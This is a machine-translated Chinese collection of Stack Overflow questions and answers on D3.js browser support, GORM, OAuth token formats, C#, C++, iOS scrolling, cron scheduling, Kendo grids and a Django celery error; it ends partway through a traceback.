# StackOverflow 问答 15159000-15159999

# browser - D3.JS 浏览器支持

> ID：15159002
> 
> 赞同：42
> 
> 时间：2013-03-01T13:32:08.390
> 
> 标签：browser, cross-browser, d3.js

具有 D3.JS 经验的开发人员能否指出在实践中哪些特定浏览器和浏览器版本级别最容易支持 D3.JS 库？

是否有已知与特定浏览器和浏览器版本级别不兼容的 D3.JS“组件”列表？

D3.JS 网站建议：

> ## [浏览器支持](https://github.com/mbostock/d3/wiki#browser--platform-support)
> 
> D3 支持所谓的“现代”浏览器，这通常意味着除 IE8 及以下之外的所有浏览器。D3 针对 Firefox、Chrome (Chromium)、Safari (WebKit)、Opera 和 IE9 进行了测试。D3 的某些部分可能在较旧的浏览器中工作，因为核心 D3 库具有最低要求：JavaScript 和 W3C DOM API。对于 IE8，推荐使用兼容库 Aight。D3 使用 Selectors API Level 1，但您可以预加载 Sizzle 以实现兼容性。您需要一个现代浏览器来使用 SVG 和 CSS3 过渡。D3 不是兼容层，因此如果您的浏览器不支持标准，那么您就不走运了。对不起！”

但是，我希望得到更具体的答案。

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2013-03-01T18:03:15.100

我将在这里竭尽全力将 SVG 支持与 D3 支持等同起来，因为（在我看来）这是库中最有用的部分。

考虑到这一点，此链接应该为您提供支持它的确切浏览器版本：http: [//caniuse.com/svg](http://caniuse.com/svg)

这与您从 D3 站点粘贴的内容相符：基本上除了 IE 之外的所有主要浏览器供应商都支持许多版本的 SVG。

您的问题是“在实践中”，这意味着 SVG。[是的，我知道有一些将 D3 与 DOM 的非 SVG 部分一起使用的示例，但是库](https://github.com/mbostock/d3/wiki/Gallery)中的绝大多数示例都是基于 SVG 的。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2016-01-03T21:50:20.607

D3 是一个用于数据操作的库，其中包含许多使用 SVG 和 Canvas 进行数据可视化的辅助工具。

D3 旨在让您直接访问 HTML 和 SVG 的所有底层功能。这意味着，跨浏览器兼容性受到代码使用的元素和属性的限制，而不是 D3 本身。

以下是[HTML5](http://caniuse.com/#search=HTML5)和[CSS3](http://caniuse.com/#search=CSS3)的一些示例：

```
// Requires HTML5
d3.select('body').append('nav');

// Requires CSS3 transformations
d3.select('div').style('transform', 'matrix(1, -0.3, 0, 1, 0, 0)'); 
```

一个用于[SVG](http://caniuse.com/#search=SVG)和[SMIL](http://caniuse.com/#search=SMIL)：

```
// Requires SMIL
d3.select('rect').append('animate')
   .attr('attributeName', 'x')
   .attr('from', 10)
   .attr('to', 50); 
```

一个用于[Canvas](http://caniuse.com/#search=Canvas)：

```
// Requires Canvas
d3.select('body').append('canvas'); 
```

如果我们只考虑 D3 框架本身（例如只使用地理投影功能，而不使用 DOM 元素等），跨浏览器兼容性会受到[ECMAScript 5](http://caniuse.com/#feat=es5)浏览器支持的限制，因为大量使用`map`,`forEach`等。

# ajax - GORM 查询以查找最近的条目

> ID：15159003
> 
> 赞同：2
> 
> 时间：2013-03-01T13:32:08.910
> 
> 标签：ajax, grails, grails-orm

ORM 工作原理的新手，请多多包涵。我有一个域类

```
class MyClass()
{
    String myName
    Date mydate
} 
```

我已经引导了几个具有相同字符串和不同日期的示例。然后在我的 gsp 中，我对控制器方法进行 ajax 调用

```
def MyAjaxCall
{
    def classes = MyClass.findAll()
} 
```

我怎样才能改变这个，所以我只返回`myName`最新的唯一的`mydate`？谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-01T15:57:27.500

尝试以下几行：

```
def classes = MyClass.createCriteria().list {
    projections {
        property("id")
        groupProperty("myName")
        max("mydate")
    }
} 
```

然后获取 MyClass 实例：

```
def latestClasses = results?.collect{MyClass.read(it[0])} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-03-01T14:22:59.947

```
def classes = MyClass.withCriteria {
    projections {
        property "myName"
    }
    maxResults(1)
    order("mydate", "desc")
} 
```

# javascript - OAuth：可以将访问令牌返回为 json 吗？

> ID：15159004
> 
> 赞同：2
> 
> 时间：2013-03-01T13:32:09.967
> 
> 标签：javascript, json, oauth, jsonp

当我返回请求令牌（我是服务器）时，我会在响应正文中发送值：

```
oauth_token=946ccd316c&oauth_token_secret=395cfee8ca&oauth_callback_confirmed=true 
```

我想弄清楚是否可以跳完舞`jsonp`。签名和请求工作正常，但由于正文不是 json，解析期间响应失败。

因此，我可以回复编码为 jsonp insted 的正文（如果客户要求），如下所示：

```
callback({oauth_token:'946ccd316c',oauth_token_secret:'395cfee8ca',oauth_callback_confirmed:true}) 
```

它可能会起作用。我的问题是：

**这会打破所有标准吗？我可以更改正文的编码吗？有没有更好的办法？**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T17:25:54.897

OAuth 规范没有指定发送令牌的格式。因此，我认为您最好将它返回到 JSON 对象中，如您所示。

事实上，Google 也会在 JSON 对象中返回**access_token**，如下所示：

```
response :{
  "access_token" : "ya29S6ZQbiBQpA5Rz8oty00xj-xydfdfddteerer-1eM",
  "token_type" : "Bearer",
  "expires_in" : 3600
 } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T17:00:25.387

查看 OAuth 2.0 标准 - RFC 位于[此处](https://www.rfc-editor.org/rfc/rfc6749)。对于所需的访问令牌行为，您可能会对第 4.4.2 节（访问令牌请求）和 4.4.3（访问令牌响应）感兴趣。未指定响应正文的格式；事实上，在 JSON 编码的访问令牌响应规范中有一个示例。只要您将内容类型设置为 application/json，并使用所需的参数名称，就可以了。

# php - 如何在 PHP/MySQL 中构建高效的积分记录系统

> ID：15159010
> 
> 赞同：-3
> 
> 时间：2013-03-01T13:32:47.523
> 
> 标签：php, mysql

我的博客类型网站上有一个积分系统，用户可以通过不同的方式（评论/对帖子投票/对评论投票等）做出贡献来赚取积分。我将如何有效地记录用户在 MySQL 数据库中获得的所有积分。

目前我正在考虑在它自己的表中包含以下字段：

```
post_id,
giving_user_id,
receiving_user_id,
type,
date_added 
```

现在，很明显，如果我的网站增长并且我有 100 万……5 亿……10 亿行，如果数据类型设置正确，这种方法和结构是否能够持续运行而无需永远运行？

我主要只是插入表格，但希望它能够在未来显示之前的 20（示例）积分奖励/扣除，类似于 stackoverflow 用户统计页面。

是否有更有效的结构对我更好？

**更新信息**

是的，它在功能上非常类似于 stackoverflow，一个用户每个 postid 获得一票。@Paul Gregory 重新考虑后删除`receiving_user_id`可能是一个更好的主意，因为它几乎总是与帖子相关。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T13:36:44.617

假设您可以使用 post_id 来识别特定评论，并且您正在`type`合理地使用（作为与您的其他 ID 一样的数字），那么这种方法对于日志来说非常完美。

（我不知道究竟是什么`receiving_user_id`告诉我们我们不知道的`post_id`——我希望你不要指望它能区分帖子和评论）。

但是，如果您要在每次需要时使用该表来计算总分，则效率不会很高。

因此，您应该单独存储当前总数 - 针对每个帖子/评论。

由于您只想显示最后 20 点，因此您应该编写一些导出日志数据并每隔一段时间删除旧日志条目的内容。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T13:40:28.080

On my website I keep a point log, and basing on that I recalculate daily a summary for a given period of time. To have always current summary value, I also add the proper value to a current day/month/year sum when new entry is recorded.

About querying - with proper database indexing by date, you can achieve a decent performance even for large point logs.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T13:41:06.110

If I was you I would have a table called **points** which lists the amount of points that can be awarded for a certain actions. The structure might look something like this,

```
point_id INT PRIMARY_KEY
name VARCHAR
descriptions TEXT
number_of_points INT 
```

Then you can have a table called **user_points** where you can record when users performed actions that gave them points. This table would look something like

```
point_id INT
user_id INT
date DATE 
```

There could be better ways of doing it but thats what I suggest based on the information you've provided.

Hope that helps

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-01T13:37:33.030

从您的 POST 表中删除这些字段并创建一个非常相似的表并创建 InnoDB 外键关系：

```
id (log id)
post_id, (add relation with your post table post.id)
giving_user_id, (user id relation)
receiving_user_id, (user id relation)
type, (type as you want);
date_added (datetime or whatever); 
```

通过这种方式，您将规范化您的表格，并且您将更好地控制您的数据和日志记录。

# c# - C# Foreach 语句不包含 GetEnumerator 的公共定义

> ID：15159014
> 
> 赞同：26
> 
> 时间：2013-03-01T13:32:59.923
> 
> 标签：c#, definition, public, enumerator

我在使用 C# 构建的 Windows 窗体应用程序时遇到问题。错误说明“foreach 语句无法对 'CarBootSale.CarBootSaleList' 类型的变量进行操作，因为 'CarBootSale.CarBootSaleList' 不包含 'GetEnumerator' 的公共定义”。

我似乎无法理解是什么原因造成的。

这是引发错误的代码：

```
 List<CarBootSaleList> Sortcarboot = new List<CarBootSaleList>();

        foreach (CarBootSale c in carBootSaleList)
        {
            if (c.Charity == "N/A")
            {
                Sortcarboot.Add(carBootSaleList);
                textReportGenerator.GenerateAllReport(Sortcarboot, AppData.CHARITY);
            }
        } 
```

这是 CarBootSaleList 类，它说没有 GetEnumerator 定义：

```
public class CarBootSaleList
{

    private List<CarBootSale> carbootsales;

    public CarBootSaleList()
    {
        carbootsales = new List<CarBootSale>();
    }

    public bool AddCarBootSale(CarBootSale carbootsale)
    {
        bool success = true;
        foreach (CarBootSale cbs in carbootsales)
        {
            if (cbs.ID == carbootsale.ID)
            {
                success = false;
            }
        }
        if (success)
        {
            carbootsales.Add(carbootsale);
        }
        return success;
    }

    public void DeleteCarBootSale(CarBootSale carbootsale)
    {
        carbootsales.Remove(carbootsale);
    }

    public int GetListSize()
    {
        return carbootsales.Count();
    }

    public List<CarBootSale> ReturnList()
    {
        return carbootsales;
    }

    public string Display()
    {
        string msg = "";

        foreach (CarBootSale cbs in carbootsales)
        {
            msg += String.Format("{0}  {1}", cbs.ID, cbs.Location, cbs.Date);
            msg += Environment.NewLine;
        }
        return msg;
    } 
```

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2013-03-01T13:41:58.997

Your `CarBootSaleList` class is not a list. It is a class that contain a list.

You have three options:

Make your `CarBootSaleList` object implement `IEnumerable`

or

make your CarBootSaleList inherit from `List<CarBootSale>`

or

if you are lazy this could almost do the same thing without extra coding

```
List<List<CarBootSale>> 
```

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2013-03-01T13:46:31.523

您没有向我们展示`carBootSaleList`. 但是，从异常消息中我可以看到它的类型为`CarBootSaleList`. 此类型不实现`IEnumerable`接口，因此不能在 foreach 中使用。

你的`CarBootSaleList`班级应该实现`IEnumerable<CarBootSale>`：

```
public class CarBootSaleList : IEnumerable<CarBootSale>
{
    private List<CarBootSale> carbootsales;

    ...

    public IEnumerator<CarBootSale> GetEnumerator()
    {
        return carbootsales.GetEnumerator();
    }

    IEnumerator IEnumerable.GetEnumerator()
    {
        return carbootsales.GetEnumerator();
    }
} 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2014-12-29T21:31:07.040

在`foreach`循环中而不是`carBootSaleList`使用`carBootSaleList.data`.

您可能不再需要答案，但它可以帮助某人。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-01T13:41:48.487

You should implement the IEnumerable interface (CarBootSaleList should impl it in your case).

[http://msdn.microsoft.com/en-us/library/system.collections.ienumerable.getenumerator.aspx](http://msdn.microsoft.com/en-us/library/system.collections.ienumerable.getenumerator.aspx)

But it is usually easier to subclass System.Collections.ObjectModel.Collection and friends

[http://msdn.microsoft.com/en-us/library/system.collections.objectmodel.aspx](http://msdn.microsoft.com/en-us/library/system.collections.objectmodel.aspx)

Your code also seems a bit strange, like you are nesting lists?

# c++ - 为什么重载的赋值运算符不会被继承？

> ID：15159020
> 
> 赞同：2
> 
> 时间：2013-03-01T13:33:07.680
> 
> 标签：c++, inheritance, operator-overloading

为什么这段代码：

```
class X {
public:
    X& operator=(int p) {
        return *this;
    }
    X& operator+(int p) {
        return *this;
    }
};

class Y : public X { };

int main() {
    X x;
    Y y;
    x + 2;
    y + 3;
    x = 2;
    y = 3;
} 
```

给出错误：

```
prog.cpp: In function ‘int main()’:
prog.cpp:14:9: error: no match for ‘operator=’ in ‘y = 3’
prog.cpp:14:9: note: candidates are:
prog.cpp:8:7: note: Y& Y::operator=(const Y&)
prog.cpp:8:7: note:   no known conversion for argument 1 from ‘int’ to ‘const Y&’
prog.cpp:8:7: note: Y& Y::operator=(Y&&)
prog.cpp:8:7: note:   no known conversion for argument 1 from ‘int’ to ‘Y&&’ 
```

为什么`+`运算符是继承的，而`=`运算符不是？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-01T13:38:45.197

类`Y`包含隐式声明的赋值运算符，它隐藏了基类中声明的运算符。通常，在派生类中声明函数会隐藏在基类中声明的同名函数。

如果你想让两者都可用`Y`，请使用 using 声明：

```
class Y : public X {
public:
    using X::operator=;
}; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T13:37:46.050

您忘记了编译器在未声明时自动生成的方法。任务就是其中之一。

# iphone - UIScrollView 上的 setContentOffset 正确方式

> ID：15159023
> 
> 赞同：5
> 
> 时间：2013-03-01T13:33:16.410
> 
> 标签：iphone, ios, objective-c, cocoa-touch, uiscrollview

我正在使用此代码向下滚动`UIScrollView`，因为我正在`UIView`从底部添加一个新代码，并且我想向下滚动到它。我这样做：

```
CGPoint newOffset = CGPointMake(mainScrollView.contentOffset.x, mainScrollView.contentOffset.y + floorf(bottomAttachmentView.frame.size.height / bottomAttachmentView.multFactor));
[mainScrollView setContentOffset:newOffset animated:YES]; 
```

我基本上将我的新元素的高度添加到`y`of 中`UIScrollView`，`contentOffset`但有时它会滚动出 scrollView `contentSize`，更低，可以滚动。发生这种情况是因为我`contentSize`在调用上面的方法之前修改了 Scroll View 的高度缩小了。

你怎么称呼它，`setContentOffset`所以它不会让我的 scrollView 滚动出它自己的`contentSize`？谢谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-01T14:33:20.030

实际上，我所要做`UIScrollView`的就是像这样滚动到底部：

```
CGPoint bottomOffset = CGPointMake(0, [mainScrollView contentSize].height - mainScrollView.frame.size.height);
[mainScrollView setContentOffset:bottomOffset animated:YES]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2018-05-30T12:37:21.840

您还可以使用它滚动到 scrollView 的底部（Swift 4）

```
let targetRect = CGRect(x: 0, y: mainScrollView.contentSize.height, width: 1, height: 1)
scrollView.scrollRectToVisible(targetRect, animated: true) 
```

# java - Tomcat 服务器出现“Java(TM) Platform SE 二进制文件已停止工作”错误

> ID：15159024
> 
> 赞同：3
> 
> 时间：2013-03-01T13:33:16.457
> 
> 标签：java, tomcat, windows-8

运行 Tomcat Web 服务器时出现以下错误消息：

> “Java(TM) Platform SE 二进制文件已停止工作一个问题导致程序停止正常工作。Windows 将关闭该程序并通知您是否有可用的解决方案。”

错误的应用程序路径：C:...\jdk1.6.0_38\bin\java.exe

错误模块路径：C:..\jdk1.6.0_38\jre\bin\dt_socket.dll

操作系统：**Windows 8**（64 位）。

Java：**1.6.0_38**（64 位）。

雄猫：**7.0.25**。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-05-28T07:05:04.367

这是 Java 1.6 的一个已知错误。

见：[http ://bugs.java.com/view_bug.do?bug_id=6810745](http://bugs.java.com/view_bug.do?bug_id=6810745)

即使是最新的 1.6.0.45 也有相同的。

我已经能够用 1.7.0.80 替换 JDK/JRE，其中问题似乎已经解决。由于特定应用程序存在问题，我无法升级到 1.8。

请记住，不再支持 1.6 和 1.7。在撰写本文时，最新的是 1.8。

只需确保下载适当的 32 或 64 版本即可。您可以在此处找到以前的版本：[http ://www.oracle.com/technetwork/java/javase/archive-139210.html](http://www.oracle.com/technetwork/java/javase/archive-139210.html)

# python - 我如何在星期五运行脚本，每两周一次？

> ID：15159027
> 
> 赞同：2
> 
> 时间：2013-03-01T13:33:39.273
> 
> 标签：python, cron, scheduled-tasks

我可以使用 cron，但我不知道是否有办法设置正确的时间表。我还可以检查 Python 中的日期，每天通过 cron 运行脚本，但在我的 (Python) 脚本中检查正确的日期（我假设它有更强大的条件）。

我想限制在 1 到 7 之间的星期五运行一次，而在 15 到 21 之间的星期五限制一次跑步。但是这个选项在像 3/2013 这样有 5 个星期五的月份会有问题。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T13:35:59.173

这是你要找的吗？

把它放在 crontab 中：

```
0 7 * * 5 sh -c " if [ $(expr $(expr $(date +\%s) \/ 604800) \% 2) -eq 0 ]; then command; fi " 
```

这将在每隔一个星期五早上 7 点运行您的命令。

注：数字 604800 表示一周（3600sec * 24 * 7）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T14:23:24.880

为什么不在每个星期五运行 cron 作业，而是添加代码以将上次运行的日期写入文件。检查是否已经过了两周，重写文件，然后运行其余的 cron 作业

# asp.net-mvc - 如何启用创建，同时禁用 Kendo Grid 的编辑

> ID：15159028
> 
> 赞同：7
> 
> 时间：2013-03-01T13:33:39.067
> 
> 标签：asp.net-mvc, kendo-ui, kendo-grid

是否可以仅启用在 Kendo 网格中插入新记录，但禁用编辑记录？

我能做的最好的事情是 onDataBound 删除 JavaScript 中的“编辑”按钮。我尝试设置`Editable(ed => ed.Enabled(false))`，但在运行时出现错误。

```
@(Html.Kendo().Grid(Model)    
    .Name("Grid" + guid)
    .HtmlAttributes(new { style = "margin:20px" })
    .Columns(columns =>
    {
        columns.Bound(p => p.Id).Hidden(true);
        //a few more columns

        columns.Command(command =>
            {
                command.Edit().Text(Resources.KendoEdit).UpdateText(Resources.KendoUpdateText).CancelText(Resources.KendoCancelText);
                command.Destroy().Text(Resources.KendoDestroy);
            }).Title(Resources.KendoCommands).Width(180);

    })
    .ToolBar(toolbar => toolbar.Create().Text(Resources.KendoToolbarCreate))
    .Editable(editable => editable
        //.Enabled(false)
        .Mode(GridEditMode.InLine)
        .DisplayDeleteConfirmation(false)
    )
    .DataSource(dataSource => dataSource
        .Ajax()
        .ServerOperation(false)
        .Events(events => events.Sync("sync").Error("error"))
        .Model(mod => mod
            .Id(p => p.Id)
        )
        .Model(mod => mod
            .Field(p => p.OldRoleId).Editable(false)
        )

        .Read(read => read.Action("ChangeRole_Read", "ChangeRole"))
        .Create(update => update.Action("ChangeRole_Create", "ChangeRole"))
        .Update(update => update.Action("ChangeRole_Update", "ChangeRole"))
        .Destroy(update => update.Action("ChangeRole_Destroy", "ChangeRole"))
    )
    .Sortable()
    .Filterable(filterable => filterable
        .Extra(true)
        .Operators(operators => operators
            .ForString(str => str.Clear()
                .StartsWith(Resources.KendoFilterStartsWith)
                .IsEqualTo(Resources.KendoFilterIsEqualTo)
                .IsNotEqualTo(Resources.KendoFilterIsNotEqualTo)
                .Contains(Resources.KendoFilterContains)
                .DoesNotContain(Resources.KendoFilterDoesNotContain)
                .EndsWith(Resources.KendoFilterEndsWith)
            )
        )
        .Messages(mess => mess
            .Info(Resources.KendoFilterMsgInfo)
            .And(Resources.KendoFilterMsgAnd)
            .Or(Resources.KendoFilterMsgOr)
            .Filter(Resources.KendoFilterMsgFilter)
            .Clear(Resources.KendoFilterMsgClear)
        )
    ) 
    .Scrollable()
    .Pageable(pg => pg
        .Refresh(true)
        .Messages(ms => ms
            .First(Resources.KendoPageableFirst)
            .Last(Resources.KendoPageableLast)
            .Next(Resources.KendoPageableNext)
            .Previous(Resources.KendoPageablePrevious)
            .Empty(Resources.KendoPageableEmpty)
            .Display(Resources.KendoPageableDisplay)
        )
    )
    .Events(ev => ev
        .Edit("edit")
        .Save("save")
        .DataBound("dataBound")
    )
) 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2015-02-20T15:34:24.287

唯一的方法是将编辑按钮的可见性设置为无：

```
<style>
    #yourgridid .k-grid-edit
    {
        display: none;
    }
</style> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-07T05:54:19.657

如果没有您用于初始化网格的代码，很难回答，但我要试一试。如果我没记错的话，你必须明确告诉 Kendo 添加一个带有编辑/删除按钮的列，如下所示：

```
.Columns(columns =>
        {
            columns.Bound(m => m.Whatever);
            columns.Command(command =>
            {
                command.Edit();
                command.Destroy();
            });
        }) 
```

因此，如果您的列定义中确实有此或类似的内容，则删除它将摆脱编辑/删除，但保留网格顶部栏中的添加按钮。

如果这不是您的编辑/删除按钮的设置方式，如果您发布网格代码，我很乐意修改我的答案。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-05T08:15:58.080

我有同样的问题。

到目前为止，我唯一的解决方法是使用弹出编辑并从网格中删除编辑命令按钮。现在只需自定义编辑器模板即可。

```
@(Html.Kendo().Grid<xxxxViewModel>()
        .Name("xxxx")
        .Columns(columns =>
        {            
            .........

            columns.Command(command => { command.Destroy().Text("Del"); }).Width(80);
        })
        .ToolBar(commands => { 
            commands.Create();
        })
        .Pageable()
        .Editable(editable => editable.Mode(GridEditMode.PopUp))
        .Sortable()
        .Scrollable()
        .Filterable()       
        .Events(events => {
            //events.Save("xxxx");
        })
        .HtmlAttributes(new { style = "height:700px" })          
        .DataSource(dataSource => dataSource
            .Ajax()
            .Events(events => events.Error("error"))
            .Model(model =>
            {
                model.Id(p => p.xxxx);
                model.Field(p => p.xxxx).Editable(false);
            })
            .Create(create => create.Action("xxxx", "xxxx"))
            .Read(read => read.Action("xxxx", "xxxx"))            
            .Destroy(destroy => destroy.Action("xxxx", "xxxx"))                
        )
) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-04-23T09:01:27.563

我想也像其他人建议你需要删除

```
command.Edit() 
```

从您的行中并有一个保存按钮，您可以使用

```
toolbar.Save() 
```

干杯，萨米

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-25T14:30:29.323

此修复程序位于下面的注释行中：

```
.Columns(cols =>
{

    cols.Bound(c => c.name).Width(300);
    cols.Bound(c => c.dateBuilt);

    cols.Command(cmd =>
    {
        cmd.Select();
        //cmd.Edit();//This is the part to comment out if u want to disable edit
        cmd.Destroy();
    });
}) 
```

# django - Django celery 启动时出现 pytz 错误

> ID：15159029
> 
> 赞同：1
> 
> 时间：2013-03-01T13:33:40.000
> 
> 标签：django, pytz, celerybeat, djcelery

尝试使用 celery 和 celery beat 启动我的开发服务器时，突然出现以下错误。有一天这个东西可以工作，第二天就不行了，我没有改变任何可以解释这一点的东西。我使用工头和 Procfile.dev 启动我的服务器，如下所示：

档案：

```
web: python manage.py runserver
celeryd: python manage.py celeryd -E -B --loglevel=INFO --concurrency=3
worker: python manage.py celerycam 
```

命令：

```
foreman start -f Procfile.dev 
```

就像我说的，这从来没有给出任何错误。堆栈跟踪如下：

```
14:18:44 celeryd.1  | [2013-03-01 14:18:44,216: INFO/Beat] Celerybeat: Starting...
14:18:44 celeryd.1  | [2013-03-01 14:18:44,224: WARNING/Beat] Process Beat:
14:18:44 celeryd.1  | [2013-03-01 14:18:44,224: WARNING/Beat] Traceback (most recent call last):
14:18:44 celeryd.1  | [2013-03-01 14:18:44,224: WARNING/MainProcess] celery@Allards-MacBook-Pro.local has started.
14:18:44 celeryd.1  | [2013-03-01 14:18:44,224: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/billiard/process.py", line 273, in _bootstrap
14:18:44 celeryd.1  | [2013-03-01 14:18:44,225: WARNING/Beat] self.run()
14:18:44 celeryd.1  | [2013-03-01 14:18:44,226: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/celery/beat.py", line 472, in run
14:18:44 celeryd.1  | [2013-03-01 14:18:44,227: WARNING/Beat] self.service.start(embedded_process=True)
14:18:44 celeryd.1  | [2013-03-01 14:18:44,227: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/celery/beat.py", line 401, in start
14:18:44 celeryd.1  | [2013-03-01 14:18:44,227: WARNING/Beat] humanize_seconds(self.scheduler.max_interval))
14:18:44 celeryd.1  | [2013-03-01 14:18:44,227: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/kombu/utils/__init__.py", line 234, in __get__
14:18:44 celeryd.1  | [2013-03-01 14:18:44,228: WARNING/Beat] value = obj.__dict__[self.__name__] = self.__get(obj)
14:18:44 celeryd.1  | [2013-03-01 14:18:44,229: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/celery/beat.py", line 439, in scheduler
14:18:44 celeryd.1  | [2013-03-01 14:18:44,229: WARNING/Beat] return self.get_scheduler()
14:18:44 celeryd.1  | [2013-03-01 14:18:44,229: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/celery/beat.py", line 434, in get_scheduler
14:18:44 celeryd.1  | [2013-03-01 14:18:44,229: WARNING/Beat] lazy=lazy)
14:18:44 celeryd.1  | [2013-03-01 14:18:44,229: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/celery/utils/imports.py", line 51, in instantiate
14:18:44 celeryd.1  | [2013-03-01 14:18:44,230: WARNING/Beat] return symbol_by_name(name)(*args, **kwargs)
14:18:44 celeryd.1  | [2013-03-01 14:18:44,230: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/djcelery/schedulers.py", line 124, in __init__
14:18:44 celeryd.1  | [2013-03-01 14:18:44,231: WARNING/Beat] Scheduler.__init__(self, *args, **kwargs)
14:18:44 celeryd.1  | [2013-03-01 14:18:44,231: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/celery/beat.py", line 158, in __init__
14:18:44 celeryd.1  | [2013-03-01 14:18:44,231: WARNING/Beat] self.setup_schedule()
14:18:44 celeryd.1  | [2013-03-01 14:18:44,231: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/djcelery/schedulers.py", line 130, in setup_schedule
14:18:44 celeryd.1  | [2013-03-01 14:18:44,232: WARNING/Beat] self.install_default_entries(self.schedule)
14:18:44 celeryd.1  | [2013-03-01 14:18:44,232: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/djcelery/schedulers.py", line 216, in schedule
14:18:44 celeryd.1  | [2013-03-01 14:18:44,232: WARNING/Beat] if self.schedule_changed():
14:18:44 celeryd.1  | [2013-03-01 14:18:44,232: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/djcelery/schedulers.py", line 161, in schedule_changed
14:18:44 celeryd.1  | [2013-03-01 14:18:44,232: WARNING/Beat] self._last_timestamp = now()
14:18:44 celeryd.1  | [2013-03-01 14:18:44,232: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/djcelery/utils.py", line 65, in now
14:18:44 celeryd.1  | [2013-03-01 14:18:44,233: WARNING/Beat] return timezone.localtime(timezone.now())
14:18:44 celeryd.1  | [2013-03-01 14:18:44,233: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/utils/timezone.py", line 222, in localtime
14:18:44 celeryd.1  | [2013-03-01 14:18:44,234: WARNING/Beat] timezone = get_current_timezone()
14:18:44 celeryd.1  | [2013-03-01 14:18:44,234: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/utils/timezone.py", line 130, in get_current_timezone
14:18:44 celeryd.1  | [2013-03-01 14:18:44,234: WARNING/Beat] return getattr(_active, "value", get_default_timezone())
14:18:44 celeryd.1  | [2013-03-01 14:18:44,234: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/utils/timezone.py", line 112, in get_default_timezone
14:18:44 celeryd.1  | [2013-03-01 14:18:44,234: WARNING/Beat] _localtime = pytz.timezone(settings.TIME_ZONE)
14:18:44 celeryd.1  | [2013-03-01 14:18:44,235: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/pytz/__init__.py", line 183, in timezone
14:18:44 celeryd.1  | [2013-03-01 14:18:44,236: WARNING/Beat] fp.close()
14:18:44 celeryd.1  | [2013-03-01 14:18:44,236: WARNING/Beat] IOError: [Errno 9] Bad file descriptor 
```

我安装的软件包的版本：

```
Django==1.4.1
celery==3.0.8
pytz==2012c 
```

我曾尝试重新安装 pytz，但这并没有帮助。

任何建议如何解决这个问题？

**编辑 1**

我已经尝试过 Burhan Khalid 的回答，这确实修复了 IOError，但是抛出了一个新错误。我尝试了两个地方来粘贴 zoneinfo 数据，它们导致了不同的错误，您可以在下面找到：

当像建议的那样粘贴到 usr/share/zoneinfo/ 中时，我得到了这个：

```
14:20:07 worker.1   | Traceback (most recent call last):
14:20:07 worker.1   |   File "manage.py", line 9, in <module>
14:20:07 worker.1   |     execute_from_command_line(sys.argv)
14:20:07 celeryd.1  | Traceback (most recent call last):
14:20:07 worker.1   |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/core/management/__init__.py", line 443, in execute_from_command_line
14:20:07 celeryd.1  |   File "manage.py", line 9, in <module>
14:20:07 web.1      | Traceback (most recent call last):
14:20:07 worker.1   |     utility.execute()
14:20:07 celeryd.1  |     execute_from_command_line(sys.argv)
14:20:07 web.1      |   File "manage.py", line 9, in <module>
14:20:07 worker.1   |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/core/management/__init__.py", line 382, in execute
14:20:07 celeryd.1  |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/core/management/__init__.py", line 443, in execute_from_command_line
14:20:07 web.1      |     execute_from_command_line(sys.argv)
14:20:07 worker.1   |     self.fetch_command(subcommand).run_from_argv(self.argv)
14:20:07 celeryd.1  |     utility.execute()
